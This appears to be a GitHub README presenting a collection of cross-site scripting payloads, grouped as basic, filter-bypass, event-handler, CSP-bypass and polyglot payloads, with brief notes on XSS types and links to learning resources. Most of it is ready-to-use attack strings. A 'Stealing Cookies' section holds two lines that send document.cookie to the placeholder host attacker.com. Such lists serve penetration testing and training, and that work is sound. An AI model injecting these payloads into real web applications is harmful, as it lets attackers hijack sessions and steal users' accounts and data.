# XSS_Payload_list

# 🚀 XSS Payload Collection  

A curated list of **Cross-Site Scripting (XSS) payloads** for security researchers and penetration testers.  

---

## 🔍 What is XSS?  
**Cross-Site Scripting (XSS)** is a **web security vulnerability** that allows attackers to inject **malicious scripts** into web pages viewed by users.  

### 🔥 Why is XSS Dangerous?  
✔️ **Steal cookies & session tokens** (account hijacking)  
✔️ **Deface websites** (change page content)  
✔️ **Redirect users to malicious websites**  
✔️ **Keylogging** (steal keystrokes)  
✔️ **Bypass security policies**  

---

## 📜 XSS Payloads  

### 1️⃣ **Basic XSS Payloads**  
```html
<script>alert('XSS')</script>
"><script>alert(1)</script>
<svg onload=alert(1)>
```

### 2️⃣ **Bypassing Input Filters**  
```html
<scr<script>ipt>alert(1)</scr<script>ipt>
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<svg/onload=alert(1)>
```

### 3️⃣ **Stealing Cookies**  
```html
<script>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie;</script>
<svg/onload="fetch('http://attacker.com/log?c='+document.cookie)">
```

### 4️⃣ **Event Handler Injection**  
```html
<IMG SRC="javascript:alert('XSS');">
<BODY ONLOAD=alert('XSS')>
<svg onmouseover="alert(1)">
```

### 5️⃣ **Bypassing CSP (Content Security Policy)**  
```html
<svg/onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
<object data="javascript:alert(1)"></object>
```

### 6️⃣ **Polyglot XSS Payloads**  
```html
"><script>alert(1)</script>
'"><svg onload=alert(1)>
"><img src=x onerror=alert(1)>
```

---

## 📚 Understanding XSS Payloads  
XSS payloads are **malicious JavaScript or HTML code** designed to execute in a victim's browser. These payloads exploit insecure web applications to run unwanted scripts.  

### 📌 **Types of XSS Attacks**  
- **Stored XSS** – Malicious script is permanently stored on a website (e.g., comment section).  
- **Reflected XSS** – The payload is included in a request and reflected back (e.g., search bar).  
- **DOM-based XSS** – Manipulates the browser's Document Object Model (DOM) to inject scripts dynamically.  

---

## 📜 References & Learning Resources  

📌 **Understanding XSS Attacks:**  
🔹 **OWASP XSS Cheat Sheet** - [OWASP](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)  
🔹 **PortSwigger Web Security Academy** - [PortSwigger](https://portswigger.net/web-security/cross-site-scripting)  
🔹 **PayloadsAllTheThings - XSS Collection** - [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings)  

📌 **Books on Web Security & XSS:**  
📖 **The Web Application Hacker’s Handbook** - [Amazon](https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470)  
📖 **XSS Attacks: Cross-Site Scripting Exploits & Defense** - [Amazon](https://www.amazon.com/XSS-Attacks-Scripting-Exploits-Defense/dp/1597491543)  

---

## 🤝 Contributing  
Want to improve this collection? Feel free to submit a **pull request**!  

---

## 📜 License  
This repository is open-source and available under the **MIT License**.  

---

🚀 **Happy Ethical Hacking! Stay Secure!** 🔥  
